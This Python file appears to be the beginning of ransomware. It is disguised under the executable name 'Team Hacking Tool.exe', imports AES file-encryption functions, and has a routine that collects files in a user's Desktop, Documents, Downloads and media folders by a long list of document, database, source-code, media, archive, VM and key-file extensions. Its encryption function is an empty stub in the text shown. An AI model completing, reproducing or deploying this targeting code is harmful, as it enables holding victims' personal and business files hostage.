import os
from pyAesCrypt import encryptFile, decryptFile

project_name = "Team Hacking Tool.exe"

def find_files():
    allFiles = []
    valid_extensions = ["der", "pfx", "key", "crt", "csr", "p12", "pem", "odt", "ott", "sxw", "stw", "uot", "3ds", "max", "3dm", "ods", "ots", "sxc", "stc", "dif", "slk", "wb2", "odp", "otp", "sxd", "std", "uop", "odg", "otg", "sxm", "mml", "lay", "lay6", "asc", "sqlite3", "sqlitedb", "sql", "mdb", "db", "dbf", "odb", "frm", "myd", "myi", "ibd", "mdf", "ldf", "sln", "suo", "cs", "c", "cpp", "pas", "h", "js", "vb", "pl", "dip", "dch", "sch", "brd", "jsp", "php", "asp", "rb", "java", "jar", "class", "sh", "mp3", "wav", "swf", "fla", "wmv", "mpg", "vob", "mpeg", "asf", "avi", "mov", "mp4", "3gp", "mkv", "3g2", "flv", "wma", "mid", "m3u", "m4u", "ai", "psd", "nef", "tiff", "tif", "cgm", "raw", "gif", "png", "bmp", "backup", "zip", "rar", "7z", "gz", "tgz", "tar", "bak", "tbk", "tar", "bz2", "paq", "arc", "aes", "gpg", "vmx", "vmdk", "vdi", "602", "hwp", "edb", "potm", "potx", "ppam", "ppsx", "ppsm", "pps", "pot", "pptm", "xltm", "xltx", "xlc", "xlm", "xlt", "xlw", "xlsb", "xlsm", "dotx", "dotm", "dot", "docm", "docb", "jpg", "jpeg", "dwg", "pdf", "rtf", "csv", "txt", "wk1", "wks", "123", "vsdx", "vsd", "eml", "msg", "ost", "pst", "pptx", "ppt", "xlsx", "xls", "docx", "doc"]
    allowed_dirs = ["Desktop", "Documents", "Downloads", "Music", "Videos", "Pictures"]
    username = os.path.expanduser("~")
    for dirs in allowed_dirs:
        for root, subfiles, files in os.walk(os.path.join(username, dirs)):
            for names in files:
                if names == project_name or names.split(".")[-1].lower() not in valid_extensions:
                    continue
                allFiles.append(os.path.join(root, names))
    return allFiles

def encryptFiles(files):
    for file in files:
        return
